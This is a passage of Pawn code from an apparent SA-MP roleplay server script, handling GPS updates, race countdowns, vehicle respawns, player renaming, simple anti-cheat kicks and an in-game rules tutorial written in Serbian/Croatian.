    // if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && !Pojas[playerid])
    // {

    //     if(AdminDuty[playerid]) return 0;
    //     if(PlayerCP[playerid] > 0) return 0;

    //     new
    //         Float:vX,
    //         Float:vY,
    //         Float:vZ,
    //         Float:health;

    //     GetVehicleVelocity(vehicleid, vX, vY, vZ);
    //     GetVehicleHealth(vehicleid, health);

    //     if (!IsVehicleAuto(vehicleid))
    //     {
    //         return 0;
    //     }
    //     if (floatround(floatsqroot((vX * vX) + (vY * vY) + (vZ * vZ)) * 100) > 55)
    //     {
    //         new
    //             Float:x,
    //             Float:y,
    //             Float:z,
    //             Float:hp;

    //         SendInfoMessage(playerid, "Ispao si iz vozila zato sto nisi vezao pojas!");

    //         GetVehiclePos(vehicleid, x, y, z);
    //         SetPlayerPos(playerid, x, y, z);

    //         GetPlayerHealth(playerid, hp);
    //         SetPlayerHealth(playerid, hp - (10 + random(45)));

    //         ApplyAnimation(playerid, "CRACK", "null", 0.0, 0, 0, 0, 0, 0);
    //         ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0);

    //         SetPlayerDrunkLevel(playerid, 50000);

    //         SetTimerEx("StandUp", 3000, false, "i", playerid);
    //     }
    // }

	static fc_tires, fc_lights;
    GetVehicleDamageStatus( vehicleid, fc_lights, fc_tires, fc_lights, fc_tires );
	if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER ) {
	    if( fc_lights || fc_tires )
	        return 1;

		new time = GetTickCount( );
		switch( time - antiCheatCS[ playerid ][ CPSTick ] ) {
			case 0 .. 500: {
				antiCheatCS[ playerid ][ CPSCount ] ++;
				if( antiCheatCS[ playerid ][ CPSCount ] >= 10 ) {
					format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Cleo Particle Spam", ImeIgraca( playerid ) );
					AdminPoruka( SVETLOCRVENA, globalstring );
					Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Cleo Particle Spam");
					return 1;
				}
			}
			default: antiCheatCS[ playerid ][ CPSCount ] = 0;
		}
		antiCheatCS[ playerid ][ CPSTick ] = time;
	}

    return 1;
}

//------------------------------------------------------------------------------
public UpdatePlayerGps(playerid, fresh) {
	new bool:arrived = false;
	if( IsPlayerInRangeOfPoint( playerid, 20.0, PlayerGpsRadar[ playerid ][_pgrPos][0], PlayerGpsRadar[ playerid ][_pgrPos][1], PlayerGpsRadar[ playerid ][_pgrPos][2 ] ) ) {
		arrived = true;
		if( IsValidDynamicMapIcon(PlayerGpsRadar[ playerid ][_pgrIconId ] ) ) {
			DestroyDynamicMapIcon(PlayerGpsRadar[ playerid ][_pgrIconId] );
		}
		
		PlayerGpsRadar[ playerid ][_pgrIconId] = -1;
	}

	if(!arrived) {
		
	    new Float:x1, Float:y1, Float:z1;
	    GetPlayerPos(playerid, x1, y1, z1);

	    new Float:x2 = PlayerGpsRadar[ playerid ][_pgrPos][0];
	    new Float:y2 = PlayerGpsRadar[ playerid ][_pgrPos][1];
	    new Float:z2 = PlayerGpsRadar[ playerid ][_pgrPos][2];

		new distanceString[64], Float:distance = floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
		new zonen[32];

		GetZoneName(x2, y2, zonen, sizeof(zonen));
		format(distanceString, sizeof(distanceString), "Udaljenost: %.2f metara~n~%s", distance, zonen);
		PlayerTextDrawSetString(playerid, PlayerGpsRadarText[ playerid ], distanceString);

		if(fresh) {
			PlayerTextDrawShow( playerid, PlayerGpsRadarText[ playerid ] );
		}
	
    
        if( IsPlayerInAnyVehicle( playerid ) ) {
        
            new Float:x22 = PlayerGpsRadar[ playerid ][_pgrPos][0];
			new Float:y22 = PlayerGpsRadar[ playerid ][_pgrPos][1];
		    new Float:VPos[ 3 ], Float:Rotation;
		    
	 		GetVehiclePos( GetPlayerVehicleID( playerid ), VPos[ 0 ], VPos[ 1 ], VPos[ 2 ] );
	 		Rotation = PointAngle( playerid, VPos[ 0 ], VPos[ 1 ], x22, y22 );
			AttachDynamicObjectToVehicle( PlayerGpsRadar[ playerid ][ _pgrObject ], GetPlayerVehicleID( playerid ), 0.0, 0.0, 1.5, 0.0, 90.0, Rotation );
		}
        
		SetTimerEx("UpdatePlayerGps", 100, false, "dd", playerid, 0);
	} else {
        PlayerTextDrawHide(playerid, PlayerGpsRadarText[ playerid ] );
        DestroyDynamicMapIcon( PlayerGpsRadar[ playerid ][ _pgrIconId ] );
        DestroyDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] );
        PlayerGpsRadar[ playerid ][ _pgrIconId ] = -1;
        PlayerGpsRadar[ playerid ][ _pgrObject ] = -1;
	}
}

public GetPlayerBusinessId( playerid, type ) {
	for (new i = 1; i < MAX_BUSSINES; i++) {
		if( IsPlayerInRangeOfPoint( playerid, 50.0, BussinesInfo[ i ][ bExitX ], BussinesInfo[ i ][ bExitY ], BussinesInfo[ i ][ bExitZ ] ) && GetPlayerVirtualWorld( playerid ) == BussinesInfo[ i ][ bInVW ] )
        {
            if( BussinesInfo[ i ][ bType ] == type )
            {
            	if( BussinesInfo[ i ][ bProducts ] <= 0) return -2;
				return i;
			}
		}
	}

	return -1;
}

//------------------------------------------------------------------------------
task EventTimeR[1000]()
{
	if( EventInfo[ eID ] != 0 ) {
		EventInfo[ EventTime ]--;
		switch( EventInfo[ EventTime ] ) {
			case 0: {
	            foreach( Player, i ) {
					if( PlayerCP[ i ] > 0 ) {
						SetPlayerRaceCheckpoint( i, 0, CheckPoint[ EventInfo[ eID ] ][ PlayerCP[ i ] ][ CPX ], CheckPoint[ EventInfo[ eID ] ][ PlayerCP[ i ] ][ CPY ], CheckPoint[ EventInfo[ eID ] ][ PlayerCP[ i ] ][ CPZ ], CheckPoint[ EventInfo[ eID ] ][ PlayerCP[ i ]+1 ][ CPX ], CheckPoint[ EventInfo[ eID ] ][ PlayerCP[ i ]+1 ][ CPY ], CheckPoint[ EventInfo[ eID ] ][ PlayerCP[ i ]+1 ][ CPZ ], 7.0 );
						TogglePlayerControllable( i, true );
						GameTextForPlayer( i ,"~g~GO GO GO!!!", 2000, 5 );
					}
				}
			}
			case 1: {
			    foreach( Player, i ) {
					if( PlayerCP[ i ] > 0 ) {
					    GameTextForPlayer( i ,"~r~1", 999, 5 );
					}
				}
			}
			case 2: {
			    foreach( Player, i ) {
					if( PlayerCP[ i ] > 0 ) {
					    GameTextForPlayer( i ,"~y~2", 999, 5 );
					}
				}
			}
			case 3: {
			    foreach( Player, i ) {
					if( PlayerCP[ i ] > 0 ) {
					    GameTextForPlayer( i ,"~b~3", 999, 5 );
					}
				}
			}
			case 8: {
			    format( globalstring, sizeof( globalstring ), ""col_orange"%s Event | "col_white"Event pocinje za {A6A6A6}5 sekundi", Event[ EventInfo[ eID ] ][ Name ] );
				SCMA( -1, globalstring );
			}
			case 13: {
			    format( globalstring, sizeof( globalstring ), ""col_orange"%s Event | "col_white"Imate {A6A6A6}10 "col_white"sekundi da se prijavite.", Event[ EventInfo[ eID ] ][ Name ] );
				SCMA( -1, globalstring );
			}
		}
	}
	
}
//------------------------------------------------------------------------------

forward TimerIzazov( playerid );
public TimerIzazov( playerid ) {
	if( TrkaIzazov[ playerid ] != 0 ) {
	    TrkaIzazov[ playerid ]--;
	    switch( TrkaIzazov[ playerid ] ) {
			case 0: {
			    SetPlayerRaceCheckpoint( playerid, 0, -1431.3984, -129.8569, 1045.4110, -1456.4524, -282.5754, 1050.6942, 7.0 );
				TrkaCheckpoint[ playerid ] = 1;
				Novi_KillTimer( IzazivanjeTimer[ playerid ] );
				TogglePlayerControllable( playerid, true );
				GameTextForPlayer( playerid ,"~g~GO GO GO!!!", 2000, 5 );
			}
			case 1: {
			    GameTextForPlayer( playerid ,"~r~1", 999, 5 );
			}
			case 2: {
			    GameTextForPlayer( playerid ,"~y~2", 999, 5 );
			}
			case 3: {
			    GameTextForPlayer( playerid ,"~b~3", 999, 5 );
			}
		}
	}
}
//------------------------------------------------------------------------------
public Provera1( playerid, type )
{

    new Float:pos[ 3 ];
    GetPlayerPos(playerid, pos[ 0 ], pos[ 1 ], pos[ 2 ] );
    Novi_SetPlayerPos(playerid, pos[ 0 ], pos[ 1 ], pos[ 2 ] );

    SetCameraBehindPlayer( playerid );
    TogglePlayerControllable( playerid, false );
    SetTimerEx( "Provera2", 3000, 0, "ii", playerid, type );
    return 1;
}
//============================================================================//
public Provera2( playerid, type )
{
    new Float:testpos[ 6 ];
    GetPlayerCameraPos( playerid, testpos[ 0 ], testpos[ 1 ], testpos[ 2 ] );
    GetPlayerPos( playerid, testpos[ 3 ], testpos[ 4 ], testpos[ 5 ] );
    TogglePlayerControllable( playerid, true );

    if( floatabs( testpos[ 2 ] - testpos[ 5 ] ) > 1.5 )
    {
	    format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Instaliran S0beit", ImeIgraca( playerid ) );
		SendClientMessageToAll( 0xFF6347AA, globalstring );
	    Kickovanje( playerid, "Kickovan: SOBEIT" );
    }
    return 1;
}
//------------------------------------------------------------------------------

forward VehiclePrivateRespawn( vehicleid );
public VehiclePrivateRespawn( vehicleid ) {
        if( vehicleid != INVALID_VEHICLE_ID ) {
            if(!PrivatnoVozilo(vehicleid)) occupied[ vehicleid ] = true;
			if( IsTrailerAttachedToVehicle( vehicleid ) ) occupied[ GetVehicleTrailer( vehicleid ) ] = true;
            if( !occupied[ vehicleid ] ) {
            	SetVehicleToRespawn( vehicleid );
            } else occupied[ vehicleid ] = false;
        }
        if( vehicleid+1 < MAX_VEHICLES ) SetTimerEx( "VehiclePrivateRespawn", 10, false, "d", vehicleid+1 );
        else ServerInfo[ RRVehicle ] = false, AdminPoruka( 0xFFC0CBAA, "|RESPAWN| Respawn praznih privatnih vozila je zavrsen!" );
        return 1;
}

forward RespawnCallGlobal( );
public RespawnCallGlobal( ) {
	for( new i = 0; i < MAX_PLAYERS; i++ ) {
		if( IsPlayerConnected( i ) ) {
			if( IsPlayerInAnyVehicle( i ) ) {
				if( IsTrailerAttachedToVehicle( GetPlayerVehicleID( i ) ) ) occupied[ GetVehicleTrailer( GetPlayerVehicleID( i ) ) ] = true;
		       	if( !occupied[ GetPlayerVehicleID( i ) ] )
		       		occupied[ GetPlayerVehicleID( i ) ] = true;
			}
		}
	}
	SetTimerEx( "VehicleRespawn", 10, false, "d", 0 );
	ServerInfo[ RRVehicle ] = true;
	AdminPoruka( 0xFFC0CBAA, "|RESPAWN| Server je pokrenuo respawn svih vozila!" );
	return 1;
}

forward RespawnCall( playerid, broj );
public RespawnCall( playerid, broj ) {
	switch( broj ) {
	    case 1: {
	        for( new i = 0; i < MAX_PLAYERS; i++ ) {
				if( IsPlayerConnected( i ) ) {
					if( IsPlayerInAnyVehicle( i ) ) {
						if( !occupied[ GetPlayerVehicleID( i ) ] )
							occupied[ GetPlayerVehicleID( i ) ] = true;
		            }
				}
	        }
	        SetTimerEx( "VehiclePrivateRespawn", 10, false, "d", 0 );
	        ServerInfo[ RRVehicle ] = true;
			format( globalstring, sizeof( globalstring ), "|RESPAWN| %s je pokrenuo respawn praznih osobnih vozila!", ImeIgraca( playerid ) );
			AdminPoruka( 0xFFC0CBAA, globalstring );
	    }
	    case 2: {
	        for( new i = 0; i < MAX_PLAYERS; i++ ) {
				if( IsPlayerConnected( i ) ) {
					if( IsPlayerInAnyVehicle( i ) ) {
						if( !occupied[ GetPlayerVehicleID( i ) ] )
							occupied[ GetPlayerVehicleID( i ) ] = true;
					}
				}
			}
			SetTimerEx( "VehicleJobsRespawn", 10, false, "d", 0 );
	        ServerInfo[ RRVehicle ] = true;
			format( globalstring, sizeof( globalstring ), "|RESPAWN| %s je pokrenuo respawn praznih poslovnih vozila!", ImeIgraca( playerid ) );
	        AdminPoruka( 0xFFC0CBAA, globalstring );
	    }
	    case 3: {
	        for( new i = 0; i < MAX_PLAYERS; i++ ) {
				if( IsPlayerConnected( i ) ) {
					if( IsPlayerInAnyVehicle( i ) ) {
						if( !occupied[ GetPlayerVehicleID( i ) ] )
							occupied[ GetPlayerVehicleID( i ) ] = true;
					}
				}
			}
			
			SetTimerEx( "VehicleOrgRespawn", 10, false, "d", 0 );
			ServerInfo[ RRVehicle ] = true;
			format( globalstring, sizeof( globalstring ), "|RESPAWN| %s je pokrenuo respawn praznih organizacijskih vozila!", ImeIgraca( playerid ) );
       	 	AdminPoruka( 0xFFC0CBAA, globalstring );
	    }
	    case 4: {
	        for( new i = 0; i < MAX_PLAYERS; i++ ) {
				if( IsPlayerConnected( i ) ) {
  					if( IsPlayerInAnyVehicle( i ) ) {
				    	if( !occupied[ GetPlayerVehicleID( i ) ] )
				    		occupied[ GetPlayerVehicleID( i ) ] = true;
					}
				}
			}
			SetTimerEx( "VehicleRentRespawn", 10, false, "d", 0 );
			ServerInfo[ RRVehicle ] = true;
			format( globalstring, sizeof( globalstring ), "|RESPAWN| %s je pokrenuo respawn praznih rentanih vozila!", ImeIgraca( playerid ) );
			AdminPoruka( 0xFFC0CBAA, globalstring );
	    }
	    case 5: {
	        for( new i = 0; i < MAX_PLAYERS; i++ ) {
				if( IsPlayerConnected( i ) ) {
					if( IsPlayerInAnyVehicle( i ) ) {
						if( IsTrailerAttachedToVehicle( GetPlayerVehicleID( i ) ) ) occupied[ GetVehicleTrailer( GetPlayerVehicleID( i ) ) ] = true;
				       	if( !occupied[ GetPlayerVehicleID( i ) ] )
				       		occupied[ GetPlayerVehicleID( i ) ] = true;
					}
				}
			}
	        SetTimerEx( "VehicleRespawn", 10, false, "d", 0 );
		    ServerInfo[ RRVehicle ] = true;
			format( globalstring, sizeof( globalstring ), "|RESPAWN| %s je pokrenuo respawn svih vozila!", ImeIgraca( playerid ) );
        	AdminPoruka( 0xFFC0CBAA, globalstring );
	    }
	}
	return 1;
}

forward VehicleRespawn( vehicleid );
public VehicleRespawn( vehicleid ) {
        if( vehicleid != INVALID_VEHICLE_ID ) {
            if( !occupied[ vehicleid ] ) {
            // if(!isVehicleOccupied(vehicleid)) {

            	SetVehicleToRespawn( vehicleid );

                // foreach(Player, i) {

                //     if(vehicleid == WorkShopVeh[i] && WorkShopVeh[i] != -1) {

                //         Novi_DestroyVehicle(WorkShopVeh[i]);
                //         WorkShopVeh[i] = -1;
                //         resetWorkshopBuying(i);
                //         SendInfoMessage(i, "Tvoje WorkShop vozilo je unistneno zbog respawna! Idalje mozes ovesti TowTruck i dobiti auto!");
                //     }
                //     if(vehicleid == WorkShopVehTow[i] && WorkShopVehTow[i] != -1) {

                //         Novi_DestroyVehicle(WorkShopVehTow[i]);
                //         WorkShopVehTow[i] = -1;
                //         resetWorkshopBuying(i);
                //         SendInfoMessage(i, "Tvoj TowTruck iz WorkShop-a je unisten zbog respawna!");
                //     }

                //     if(vehicleid == DronVozi[i] && DronVozi[i] != -1) {

                //         Novi_DestroyVehicle( DronVozi[ i ] );
                //         DronVozi[ i ] = -1;
                //         SendInfoMessage(i, "Tvoj dron je unisten zbog respawna!");
                //     }

                //     if(vehicleid == pilotVozilo[i] && pilotVozilo[i] != -1) {

                //         DisablePlayerCheckpoint(i);

                //         radiPilot[ i ] = 0;
                //         if(IsValidVehicle(pilotVozilo[i]))
                //             Novi_DestroyVehicle(pilotVozilo[i]);

                //         pilotVozilo[i] = -1;

                //         PostaviSkin( i, PlayerInfo[ i ][ xSkin ] );
                //         UzeoOpremu[ i ] = false;

                //         SendInfoMessage(i, "Tvoje vozilo ")
                //     }

                //     if(vehicleid == posaoDrvaVozilo[i] && posaoDrvaVozilo[i] != -1) {

                //         DisablePlayerCheckpoint(i);

                //         prevoziDrva[ i ] = 0;
                //         if(IsValidVehicle(posaoDrvaVozilo[i]))
                //             Novi_DestroyVehicle(posaoDrvaVozilo[i]);

                //         posaoDrvaVozilo[i] = -1;

                //         // if(IsValidDynamicObject(posaoDrvaObjekat[i]))
                //         //     DestroyDynamicObject(posaoDrvaObjekat[i]);

                //         PostaviSkin( i, PlayerInfo[ i ][ xSkin ] );
                //         UzeoOpremu[ i ] = false;
                //     }

                //     if(vehicleid == kosacVozilo[i] && kosacVozilo[i] != -1) {

                //         DisablePlayerCheckpoint(i);

                //         PokosenaTrava[ i ] = 0;
                //         KrenuoKosenje[ i ] = false;

                //         Novi_DestroyVehicle(kosacVozilo[i]);
                //         kosacVozilo[i] = -1;
                //         TogglePlayerControllable( i, true );

                //         PostaviSkin( i, PlayerInfo[ i ][ xSkin ] );
                //         UzeoOpremu[ i ] = false;
                //     }

                //     if(vehicleid == DeliveryVozilo[i] && DeliveryVozilo[i] != -1) {

                //         Novi_DisablePlayerCheckpoint(i);
                //         DeliveryCP[i] = 0;
                //         RadiDelivery[i] = false;

                //         Novi_DestroyVehicle(DeliveryVozilo[i]);
                //         DeliveryVozilo[i] = -1;

                //         PostaviSkin( i, PlayerInfo[ i ][ xSkin ] );
                //         UzeoOpremu[ i ] = false;
                //     }

                //     if(vehicleid == RentVozilo[i]) {

                //         Novi_DestroyVehicle(RentVozilo[i]);
                //         Rentao[i] = false;
                //         RentVozilo[i] = -1;
                //         SendInfoMessage(i, "Rent vozilo ti je unisteno! Vise ga ne rentas.");
                //     }

                //     if( AdminVozilo[ i ] != -1 && vehicleid == AdminVozilo[i] ) Novi_DestroyVehicle( AdminVozilo[ i ] ), AdminVozilo[ i ] = -1;

                //     if( helperVeh[ i ] != -1 && vehicleid == helperVeh[i] ) Novi_DestroyVehicle( helperVeh[ i ] ), helperVeh[ i ] = -1;

                //     if( VPVeh[ i ] != -1 ) Novi_DestroyVehicle( VPVeh[ i ] ), VPVeh[ i ] = -1;

                //     if(OrgVeh[i] == vehicleid) {

                //         new id = OrgVehID[i];
                //         if(OrgVehBroj[i] == 1) {

                //             OrgVehInfo[id][oVehKolicina1]++;
                //         }
                //         if(OrgVehBroj[i] == 2) {

                //             OrgVehInfo[id][oVehKolicina2]++;
                //         }
                //         if(OrgVehBroj[i] == 3) {

                //             OrgVehInfo[id][oVehKolicina3]++;
                //         }
                //         if(OrgVehBroj[i] == 4) {

                //             OrgVehInfo[id][oVehKolicina4]++;
                //         }
                //         if(OrgVehBroj[i] == 5) {

                //             OrgVehInfo[id][oVehKolicina5]++;
                //         }
                //         Novi_DestroyVehicle(OrgVeh[i]);
                //         OrgVeh[i] = -1;
                //         // Delete3DTextLabel(OrgVehLabelIgrac[i]);
                //         SacuvajOrgVehPickup(id);
                //     }
                // }

            }
        }
        if( vehicleid+1 < MAX_VEHICLES ) SetTimerEx( "VehicleRespawn", 10, false, "d", vehicleid+1 );
        else ServerInfo[ RRVehicle ] = false, AdminPoruka( 0xFFC0CBAA, "|RESPAWN| Respawn svih vozila je zavrsen!" );
        return 1;
}
//------------------------------------------------------------------------------
IsACabrio(model)
{
	if(	model == 424 || model == 429 || model == 430 || model == 439 || model == 446 ||
		model == 448 || model == 452 || model == 453 || model == 454 || model == 457 ||
		model == 461 || model == 462 || model == 463 || model == 468 || model == 471 ||
		model == 472 || model == 473 || model == 476 || model == 480 || model == 481 ||
		model == 484 || model == 485 || model == 486 || model == 493 || model == 500 ||
		model == 506 || model == 509 || model == 510 || model == 512 || model == 513 ||
		model == 521 || model == 522 || model == 523 || model == 530 || model == 531 ||
		model == 533 || model == 536 || model == 539 || model == 555 || model == 567 ||
		model == 568 || model == 571 || model == 572 || model == 575 || model == 581 ||
		model == 586) return 1;
	return 0;
}
//------------------------------------------------------------------------------
RenamePlayer( staroime[], name[], playerid ) {

	new oldname[ 40 ], newname[ 40 ];
	new voziloid1 = PlayerInfo[ playerid ][ xVoziloID ][ 0 ];
	new voziloid2 = PlayerInfo[ playerid ][ xVoziloID ][ 1 ];
	new voziloid3 = PlayerInfo[ playerid ][ xVoziloID ][ 2 ];
	new voziloid4 = PlayerInfo[ playerid ][ xVoziloID ][ 3 ];
	new imovina1 = PlayerInfo[ playerid ][ xProperty ][ 0 ];
	new imovina2 = PlayerInfo[ playerid ][ xProperty ][ 1 ];
	new imovina3 = PlayerInfo[ playerid ][ xProperty ][ 2 ];
	new firma = PlayerInfo[ playerid ][ xFirmaID ];
	new hotel = PlayerInfo[ playerid ][ xHotelID ];
    new radionica = PlayerInfo[playerid][xWorkShopGarage];
    new btcworkshop = PlayerInfo[playerid][xWorkShopID];
    new nafta = PlayerInfo[playerid][xNaftaID];
    format( oldname, sizeof( oldname ), "Korisnici/%s.ini", staroime );
	format( newname, sizeof( newname ), "Korisnici/%s.ini", name );
    if( fexist( newname ) ) return SendErrorMessage( playerid, "Novo ime vec postoji u bazi podataka!" );
	if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 && strcmp( ImeIgraca( playerid ), II[ imovina1 ][ iOwner ], true) == 0)
	{
	    strmid( II[ imovina1 ][ iOwner ], name, 0, strlen( name ), 24 );
		PropertyRefresh( imovina1 ); SaveProperty( imovina1 );
	}
	if( PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 && strcmp( ImeIgraca( playerid ), II[ imovina2 ][ iOwner ], true) == 0)
	{
	    strmid( II[ imovina2 ][ iOwner ], name, 0, strlen( name ), 24 );
		PropertyRefresh( imovina2 ); SaveProperty( imovina2 );
	}
	if( PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 && strcmp( ImeIgraca( playerid ), II[ imovina3 ][ iOwner ], true) == 0)
	{
	    strmid( II[ imovina3 ][ iOwner ], name, 0, strlen( name ), 24 );
		PropertyRefresh( imovina3 ); SaveProperty( imovina3 );
	}
	if( PlayerInfo[ playerid ][ xFirmaID ] != -1 && strcmp( ImeIgraca( playerid ), BussinesInfo[ firma ][ bOwner ], true) == 0) {
	    strmid( BussinesInfo[ firma ][ bOwner ], name, 0, strlen( name ), 24 );
		Bussines_Refresh( firma ); SaveBussines( firma );
	}
	if( PlayerInfo[ playerid ][ xHotelID ] != -1 && strcmp( ImeIgraca( playerid ), hotelInfo[ hotel ][ hOwner ], true) == 0) {
	    strmid( hotelInfo[ hotel ][ hOwner ], name, 0, strlen( name ), 24 );
		HotelRefresh( hotel ); SaveHotel( hotel );
	}
	if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] != -1 && strcmp( ImeIgraca( playerid ), VehicleInfo[ voziloid1 ][ vOwner ], true) == 0)
	{
		strmid( VehicleInfo[ voziloid1 ][ vOwner ], name, 0, strlen( name ), 24 );
		SaveVehicle( voziloid1 );
	}
	if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] != -1 && strcmp( ImeIgraca( playerid ), VehicleInfo[ voziloid2 ][ vOwner ], true) == 0)
	{
		strmid( VehicleInfo[ voziloid2 ][ vOwner ], name, 0, strlen( name ), 24 );
		SaveVehicle( voziloid2 );
	}
	if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] != -1 && strcmp( ImeIgraca( playerid ), VehicleInfo[ voziloid3 ][ vOwner ], true) == 0)
	{
		strmid( VehicleInfo[ voziloid3 ][ vOwner ], name, 0, strlen( name ), 24 );
		SaveVehicle( voziloid3 );
	}
	if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] != -1 && strcmp( ImeIgraca( playerid ), VehicleInfo[ voziloid4 ][ vOwner ], true) == 0)
	{
		strmid( VehicleInfo[ voziloid4 ][ vOwner ], name, 0, strlen( name ), 24 );
		SaveVehicle( voziloid4 );
	}
    if( PlayerInfo[ playerid ][ xNaftaID ] != -1 && strcmp( ImeIgraca( playerid ), NaftaInfo[ nafta ][ pVlasnik ], true) == 0) {
        strmid( NaftaInfo[ nafta ][ pVlasnik ], name, 0, strlen( name ), 24 );
        SacuvajNaftnuPlatformu(nafta); NaftaLabelUpdate(nafta);
    }
    if( PlayerInfo[ playerid ][ xWorkShopID ] != -1 && strcmp( ImeIgraca( playerid ), BitcoinInfo[ btcworkshop ][ bVlasnik ], true) == 0) {
        strmid( BitcoinInfo[ btcworkshop ][ bVlasnik ], name, 0, strlen( name ), 24 );
        SacuvajBTCWorkShop(btcworkshop); BitCoinLP(btcworkshop);
    }
    if( PlayerInfo[ playerid ][ xWorkShopGarage ] != -1 && strcmp( ImeIgraca( playerid ), WorkShopInfo[ radionica ][ wVlasnik ], true) == 0) {
        strmid( WorkShopInfo[ radionica ][ wVlasnik ], name, 0, strlen( name ), 24 );
        SaveWorkShop(radionica);
        WorkShopVehicleCheck(radionica);
        WorkShopLabelUpdate(radionica);
    }
	frename( oldname, newname ); SetPlayerName( playerid, name );
    if(fexist(oldname))
        fremove(oldname);
	//SendInfoMessage( playerid, "Uspesno si promenio ime!" );
	return 1;
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
public CityTut( playerid, learnid )
{
    if( IsPlayerConnected( playerid ) )
	{
	    if(learnid == 1)
	    {
		    SetPlayerCameraPos( playerid, 1414.1941,-965.3426,58.9375 );
			SetPlayerCameraLookAt( playerid, 1420.8086,-810.6372,75.3894 );
			SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );
			Novi_SetPlayerPos( playerid, 1415.2184, -970.2783, 46.9375 );
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SendInfoMessage( playerid, "~ Pocetak TUTORIJALA? ~");
			SCM( playerid, BELA, " ");
			SCM( playerid, BELA, "Niste savladali pravila naseg servera." );
			SCM( playerid, BELA, "Slijedi tutorijal o vaznim pravilima Valhalla servera." );
			SCM( playerid, BELA, "Nakon toga kviz znanja da se provjeri koliko ste naucili." );
		    TimerLearn[ playerid ] = SetTimerEx( "CityTut", 20000, 0, "ii", playerid, 2);
		}
		else if(learnid == 2)
		{
		    SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
		 	SendInfoMessage( playerid, "~ Metagaming [MG] ~");
            SCM( playerid, BELA, " ");
			SCM( playerid, BELA, "Metagaming je koristenje OOC informacija u IC korist. ");
			SCM( playerid, BELA, "Postoji vise vrsta Metagaminga, prvi je Nick MG ako primjerice na glas govorite necije ime u IC chatu, ");
			SCM( playerid, BELA, "ali da ga jos uvijek niste upoznali IC, to jest njegovo ime niste saznali IC ili RP nacinom, ");
			SCM( playerid, BELA, "vec ste samo vidjeli ime iznad njegove glave. Druga vrsta Metagaming je Forum MG, ");
			SCM( playerid, BELA, "ukoliko neke informacije saznate preko foruma i OOC dijela i dodjete u igru i koristite ih u svoju svrhu ");
			SCM( playerid, BELA, "a da to niste IC ili na RP nacin saznali. Kao primer racije na neku bandu/mafiju. ");
			SCM( playerid, BELA, "Treci primjer je Skin MG ukoliko neki clan nosi skin nekog clana bande i sada primjerice policajac ide njega ");
			SCM( playerid, BELA, "pretresati i sve to zbog toga sto je on vidio da je on clan neke bande i slicno.");
			SCM( playerid, BELA, "Cetvri primjer je Chat MG, primjerice kada pisete u IC chat lol, xD, wtf, omg, roll, :D, :) i slicno, ");
			SCM( playerid, BELA, "jer se smajlici i skracenice ne koriste u IC chatu. ");
			TimerLearn[ playerid ] = SetTimerEx( "CityTut", 40000, 0, "ii", playerid, 3);
		}
		else if(learnid == 3)
		{
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
		 	SendInfoMessage( playerid, "~ Powergaming [PG] ~");
            SCM( playerid, BELA, " ");
		 	SCM( playerid, BELA, "Powergaming je kada prisile nekoga ili sebe na radnju koju je nemoguce izvesti u stvarnom zivotu u bilo kojem trenutku. ");
			SCM( playerid, BELA, "Primjeri za ovo Pravilo su skakanje sa nekakvih zgrada bez ozlijeda, znaci skocite i nastavite hodat ili trcat bez da vam se ista dogodilo. ");
			SCM( playerid, BELA, "Drugi primjer je izbjegavanje i bjezanje od metaka, jer znate i sami da je jako tesko izbjeci metak koji vas pogodi i da je uopse tesko ");
			SCM( playerid, BELA, "preziviti ako vas pogodi vice metaka a da pri tome nemate pancirku na sebi. Treci primjer je kada netko uperi neko oruzije u vas i sad vi ");
			SCM( playerid, BELA, "ne znate sta cete i vi vadite svoje oruzije nabrzinu i pucate na njega, to je strogo zabranjeno i kaznjivo pravilo");
			SCM( playerid, BELA, "i molim vas da ga se pridrzavate.");
		    TimerLearn[ playerid ] = SetTimerEx( "CityTut", 30000, 0, "ii", playerid, 4 );
		}
		else if(learnid == 4)
		{
		    SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
			SCM( playerid, 0xAFAFAFAA," ");
